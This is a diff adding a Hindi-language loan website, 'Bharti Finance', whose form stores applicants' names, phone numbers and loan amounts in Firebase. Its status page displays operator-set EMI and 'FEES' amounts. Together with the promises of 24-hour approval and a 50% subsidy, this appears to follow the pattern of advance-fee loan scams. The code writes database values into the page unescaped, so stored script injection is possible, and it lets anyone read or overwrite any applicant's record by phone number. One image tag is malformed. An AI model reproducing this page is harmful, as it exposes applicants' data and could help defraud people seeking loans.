@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bharti Finance - Aapka Bharosa</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f7f6; margin: 0; padding: 0; text-align: center; color: #333; }
+        
+        .sidenav { height: 100%; width: 0; position: fixed; z-index: 10000; top: 0; right: 0; background-color: #d32f2f; overflow-x: hidden; transition: 0.5s; padding-top: 60px; text-align: left; }
+        .sidenav a { padding: 15px 30px; text-decoration: none; font-size: 20px; color: white; display: block; border-bottom: 1px solid #b71c1c; }
+        .sidenav .closebtn { position: absolute; top: 10px; right: 25px; font-size: 40px; color: white; cursor: pointer; }
+
+        .header { background: white; padding: 10px 20px; border-bottom: 5px solid #d32f2f; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 5000; height: 70px; }
+        .logo-box h1 { color: #d32f2f; margin: 0; font-size: 28px; font-weight: 900; line-height: 1; text-transform: uppercase; }
+        .logo-box p { color: #333; margin: 0; font-weight: bold; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
+        .menu-btn { font-size: 30px; background: #d32f2f; color: white; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; border: none; }
+
+        .vision-box { background: #d32f2f; color: white; margin: 15px; padding: 25px; border-radius: 20px; }
+        .img-container { margin: 15px; border-radius: 20px; overflow: hidden; border: 4px solid white; box-shadow: 0 8px 20px rgba(0,0,0,0.15); }
+        .bank-img { width: 100%; height: auto; display: block; }
+
+        .card { background: white; margin: 15px; padding: 25px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-top: 5px solid #d32f2f; }
+        input { width: 92%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 12px; font-size: 16px; outline: none; }
+        .btn-red { width: 100%; background: #d32f2f; color: white; padding: 16px; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        .btn-dark { width: 100%; background: #333; color: white; padding: 16px; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
+
+        /* Status Check Result Styles */
+        .status-table { margin-top: 20px; display: none; background: #fff; border-radius: 20px; overflow: hidden; border: 2px solid #d32f2f; text-align: left; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .status-head { background: #d32f2f; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; }
+        .status-body { padding: 20px; }
+        
+        /* Photo Frame Style */
+        .photo-frame { width: 90%; max-width: 280px; margin: 15px auto; border: 4px solid #d32f2f; border-radius: 15px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        .photo-frame img { width: 100%; display: block; height: auto; }
+
+        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #eee; font-size: 17px; }
+        .box-container { display: flex; gap: 10px; margin: 20px 0; }
+        .mini-box { flex: 1; padding: 15px; border-radius: 15px; text-align: center; font-weight: 900; color: white; }
+        .emi-box { background: #1976d2; border-bottom: 4px solid #0d47a1; }
+        .fees-box { background: #f57c00; border-bottom: 4px solid #e65100; }
+        .approved-bar { background: #388e3c; color: white; padding: 15px; text-align: center; font-weight: 900; font-size: 22px; border-radius: 10px; }
+
+        .new-banner { margin: 10px 15px; border-radius: 15px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border: 1px solid #ddd; }
+        .new-banner img { width: 100%; display: block; }
+
+        .hindi-matter { background: white; margin: 15px; padding: 20px; border-radius: 20px; border: 2px solid #d32f2f; text-align: left; line-height: 1.7; }
+        .subsidy-box { background: #ffeb3b; padding: 15px; border-radius: 12px; font-weight: bold; text-align: center; margin: 15px 0; border: 2px dashed #000; }
+
+        .footer { background: #1a1a1a; color: white; padding: 40px 25px; margin-top: 30px; }
+    </style>
+</head>
+<body>
+
+    <div id="mySidenav" class="sidenav">
+        <span class="closebtn" onclick="closeNav()">&times;</span>
+        <a href="javascript:void(0)" onclick="closeNav()">🏠 होम</a>
+        <a href="#applySection" onclick="closeNav()">📝 लोन अप्लाई</a>
+        <a href="#statusSection" onclick="closeNav()">🔍 स्टेटस चेक</a>
+    </div>
+
+    <div class="header">
+        <div class="logo-box"><h1>BHARTI</h1><p>FINANCE SERVICES</p></div>
+        <div class="menu-btn" onclick="openNav()">☰</div>
+    </div>
+
+    <div class="vision-box">
+        <h2>Bharti Vision</h2>
+        <p>"भारत के हर नागरिक को आसान और सुरक्षित ऋण प्रदान करना हमारी प्राथमिकता है।"</p>
+    </div>
+
+    <div class="img-container">
+        <img src="https://i.ibb.co/XZTmf5wC/Screenshot-20240908-211047-Samsung-Internet.jpg" class="bank-img">
+    </div>
+
+    <div class="card" id="applySection">
+        <h3 style="color: #d32f2f;">📝 Apply Online</h3>
+        <input type="text" id="n" placeholder="आपका पूरा नाम">
+        <input type="number" id="m" placeholder="मोबाइल नंबर (10 अंक)">
+        <input type="number" id="a" placeholder="लोन राशि (₹)">
+        <button class="btn-red" onclick="saveData()">SUBMIT APPLICATION</button>
+    </div>
+
+    <div class="card" id="statusSection">
+        <h3 style="color:#333">🔍 Track Status</h3>
+        <input type="number" id="sm" placeholder="रजिस्टर्ड मोबाइल नंबर डालें">
+        <button class="btn-dark" onclick="checkStatus()">CHECK STATUS</button>
+        <div id="res" class="status-table"></div>
+    </div>
+
+    <div class="new-banner"><img src="https://i.ibb.co/7dHQ1XsX/Screenshot-20260123-193029-Samsung-Internet.jpg"
+    <div class="new-banner"><img src="https://i.ibb.co/mV9B1NLs/Screenshot-20260123-193632-Samsung-Internet.jpg"></div>
+
+    <div class="hindi-matter">
+        <p>📌 लोन लेने के लिए आज ही <b>Apply</b> करें। दस्तावेज: <b>आधार कार्ड और पैन कार्ड</b>।</p>
+        <p>⚡ मात्र <b>24 घंटे</b> में लोन अप्रूवल पाएं।</p>
+        <div class="subsidy-box">💰 समय पर किस्तें भरने पर ब्याज पर 50% की सब्सिडी!</div>
+    </div>
+
+    <div class="footer">
+        <h3>🏢 Registered Address:</h3>
+        <p>B/23, Inner Circle, Connaught Place, <br><b>New Delhi, 110001</b></p>
+    </div>
+
+    <script>
+        function openNav() { document.getElementById("mySidenav").style.width = "280px"; }
+        function closeNav() { document.getElementById("mySidenav").style.width = "0"; }
+
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyAzdiBUqO6AvuQmM7HZSFbPJ_fQZuiGu8E",
+            authDomain: "bharti-finan-e.firebaseapp.com",
+            databaseURL: "https://bharti-finan-e-default-rtdb.firebaseio.com",
+            projectId: "bharti-finan-e",
+            storageBucket: "bharti-finan-e.firebasestorage.app",
+            messagingSenderId: "448784982605",
+            appId: "1:448784982605:web:fdfc19859cfb20ea02f204"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function saveData() {
+            const name = document.getElementById('n').value;
+            const mobile = document.getElementById('m').value;
+            const amount = document.getElementById('a').value;
+            if(!name || mobile.length < 10) { alert("Sahi details bharein!"); return; }
+            // Naye cliants ke liye photo empty string jayegi pehle
+            db.ref('bharti_loans/' + mobile).set({ name, amount, emi: "0", fees: "0", status: "PENDING", photo: "" })
+            .then(() => { alert("Application Submitted Successfully!"); location.reload(); });
+        }
+
+        function checkStatus() {
+            const mobile = document.getElementById('sm').value;
+            const out = document.getElementById('res');
+            if(!mobile) { alert("Please enter mobile number"); return; }
+            
+            db.ref('bharti_loans/' + mobile).once('value').then((snap) => {
+                out.style.display = "block";
+                if(snap.exists()){
+                    const d = snap.val();
+                    // Photo logic: agar database me link hai toh photo frame dikhayega
+                    let photoHtml = (d.photo && d.photo.includes("http")) ? `<div class="photo-frame"><img src="${d.photo}"></div>` : '';
+                    
+                    out.innerHTML = `
+                        <div class="status-head">CLIENT DASHBOARD</div>
+                        <div class="status-body">
+                            ${photoHtml}
+                            <div class="info-row"><span>कस्टमर:</span> <b>${d.name}</b></div>
+                            <div class="info-row"><span>अमाउंट:</span> <b>₹${d.amount}</b></div>
+                            <div class="box-container">
+                                <div class="mini-box emi-box">EMI<br>₹${d.emi}</div>
+                                <div class="mini-box fees-box">FEES<br>₹${d.fees}</div>
+                            </div>
+                            <div class="approved-bar">${d.status}</div>
+                        </div>`;
+                } else { 
+                    out.innerHTML = "<p style='padding:20px; color:red; font-weight:bold;'>Record not found!</p>"; 
+                }
+            });
+        }
+    </script>
+</body>
+</html>
